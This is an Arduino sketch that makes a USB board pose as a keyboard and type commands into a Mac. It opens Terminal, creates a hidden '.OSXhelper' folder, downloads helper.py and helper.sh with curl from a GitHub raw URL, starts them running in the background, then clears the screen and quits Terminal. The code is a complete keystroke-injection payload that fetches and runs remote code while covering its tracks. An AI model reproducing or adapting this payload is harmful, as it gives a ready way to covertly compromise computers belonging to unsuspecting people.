#include "Keyboard.h"

void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(0x20);
  Keyboard.releaseAll();
  delay(200);

  Keyboard.print("terminal");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  

  Keyboard.print("cd");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("mkdir .OSXhelper");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("cd .OSXhelper");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.print("curl -O https://raw.githubusercontent.com/Boic69/Arduino/main/helper.py");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("nohup python helper.py &");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("curl -O https://raw.githubusercontent.com/Boic69/Arduino/main/helper.sh");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("sh helper.sh");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.print("clear");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('q');
  Keyboard.releaseAll();
}

void loop() {
  // put your main code here, to run repeatedly:

}
